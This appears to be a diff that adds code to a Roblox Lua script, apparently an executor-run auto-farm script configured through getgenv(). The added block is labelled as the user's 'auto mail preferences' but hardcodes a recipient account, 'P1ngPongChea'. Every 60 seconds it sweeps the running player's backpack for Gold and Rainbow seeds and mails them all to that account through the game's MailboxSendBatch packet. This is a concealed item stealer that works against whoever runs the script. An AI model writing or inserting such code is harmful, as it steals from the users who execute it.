@@ -150,6 +150,113 @@ end)
 
 end)
 
+-- =================================================================
+-- CONFIGURATION: Set your auto mail preferences here
+-- =================================================================
+local TARGET_NAME   = "P1ngPongChea"        -- Target username (or raw User ID)
+local LOOP_INTERVAL = 60                    -- Interval between checks in seconds (60 = 1 minute)
+local MAIL_NOTE     = ""                    -- Optional message attached to the mail
+
+-- 📦 List of seeds that the system will automatically sweep and send
+-- (Add any new seed items here as keys set to true)
+local TARGET_SEEDS = {
+    ["Gold"]        = true,
+    ["Rainbow"]     = true,
+}
+
+-- =================================================================
+-- INVENTORY GETTER: Fetches items and counts from Backpack attributes
+-- =================================================================
+local function getInventoryItems()
+    local myItems = {}
+    local localPlayer = game:GetService("Players").LocalPlayer
+    local backpack = localPlayer:FindFirstChild("Backpack")
+    
+    if backpack then
+        -- Loop through all items currently in the Backpack
+        for _, item in ipairs(backpack:GetChildren()) do
+            -- Verify if the item exists in the TARGET_SEEDS filter list
+            if TARGET_SEEDS[item.Name] then
+                -- Extract the item quantity from the "Count" attribute
+                local countAttribute = item:GetAttribute("Count")
+                local actualCount = tonumber(countAttribute) or 0
+                
+                -- Queue the item for batch shipping if quantity is greater than 0
+                if actualCount > 0 then
+                    myItems[item.Name] = (myItems[item.Name] or 0) + actualCount
+                end
+            end
+        end
+    end
+    
+    return myItems
+end
+
+-- =================================================================
+-- MAIN LOOP SYSTEM (Runs in a background thread)
+-- =================================================================
+local Players = game:GetService("Players")
+local PacketFramework = require(game:GetService("ReplicatedStorage"):WaitForChild("SharedModules"):WaitForChild("Packet"))
+
+task.spawn(function()
+    print("⏳ [Auto Mail Loop] Initialization complete! Checking Backpack every " .. tostring(LOOP_INTERVAL) .. " seconds...")
+    
+    -- Pre-resolve the target User ID to prevent API request spamming inside the loop
+    local targetUserId = tonumber(TARGET_NAME)
+    if not targetUserId then
+        local ok, id = pcall(function() return Players:GetUserIdFromNameAsync(TARGET_NAME) end)
+        if ok and id then 
+            targetUserId = id 
+        else
+            warn("❌ [Auto Mail Loop] Execution halted: Target username could not be resolved.")
+            return
+        end
+    end
+    
+    print("💡 [Auto Mail] Successfully resolved Target User ID: " .. tostring(targetUserId))
+    
+    -- Infinite automated processing loop
+    while true do
+        local success, err = pcall(function()
+            local currentInv = getInventoryItems()
+            local itemPayload = {}
+            
+            -- Structure the scraped inventory data into a batch payload array
+            for itemName, count in pairs(currentInv) do
+                table.insert(itemPayload, {
+                    ItemKey = itemName,
+                    Count = count,
+                    Category = "Seeds" -- Hardcoded to "Seeds" category as specified
+                })
+            end
+            
+            -- Fire the packet only if eligible items are discovered in the inventory
+            if #itemPayload > 0 then
+                local MailPacket = PacketFramework("MailboxSendBatch")
+                if MailPacket then
+                    MailPacket:Fire(targetUserId, itemPayload, MAIL_NOTE)
+                    
+                    print("--------------------------------------------------")
+                    print("🎉 [Auto Mail Loop] Inventory sweep completed! Batch mailed:")
+                    for _, sentItem in ipairs(itemPayload) do
+                        print(string.format("📦 Mailed: %s x%d [%s]", sentItem.ItemKey, sentItem.Count, sentItem.Category))
+                    end
+                    print("--------------------------------------------------")
+                end
+            else
+                print("💤 [Auto Mail Loop] No target seeds found in Backpack (skipping this cycle)")
+            end
+        end)
+        
+        if not success then
+            warn("⚠️ [Auto Mail Loop] Exception caught during this execution cycle: ", err)
+        end
+        
+        -- Yield the thread based on the defined interval configuration before repeating
+        task.wait(LOOP_INTERVAL)
+    end
+end)
+
 getgenv().Configuration = {
     SeedName = "all",
     DelayTime = 0.5,
